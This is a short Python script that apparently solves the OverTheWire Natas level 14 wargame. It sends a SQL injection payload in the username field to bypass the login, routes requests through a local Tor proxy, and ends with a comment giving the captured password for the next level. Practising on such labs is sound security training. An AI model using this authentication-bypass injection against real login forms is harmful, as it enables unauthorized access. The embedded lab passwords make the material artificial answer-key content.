#!/usr/bin/python3

import requests

url = 'http://natas14.natas.labs.overthewire.org/'
username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'
proxies = {"http" : "socks5://127.0.0.1:9050"}

data = {
	"username": 'please" OR 1=1 #',
	"password": "work"
}

s = requests.Session()
# response = s.get(url, data=data, auth=(username,password), proxies=proxies)
response = s.post(url + '?debug=true', data=data, auth=(username,password), proxies=proxies)


print(response.text)

# The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB